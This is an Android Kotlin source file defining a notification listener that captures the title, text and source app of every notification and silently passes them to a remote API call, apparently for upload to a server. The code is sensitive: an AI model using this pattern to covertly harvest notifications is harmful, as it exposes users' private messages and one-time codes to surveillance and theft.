package com.prabu.remote.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.prabu.remote.net.Api

class PrabuNotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val extras = sbn.notification.extras
            val title = extras.getCharSequence("android.title")?.toString()
            val text = extras.getCharSequence("android.text")?.toString()
            val appName = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(sbn.packageName,0)).toString() } catch (_:Exception){ sbn.packageName }
            Thread { try { Api.notifications(this, sbn.packageName, appName, title, text, sbn.postTime) } catch (_:Exception) {} }.start()
        } catch (_:Exception) { }
    }
}
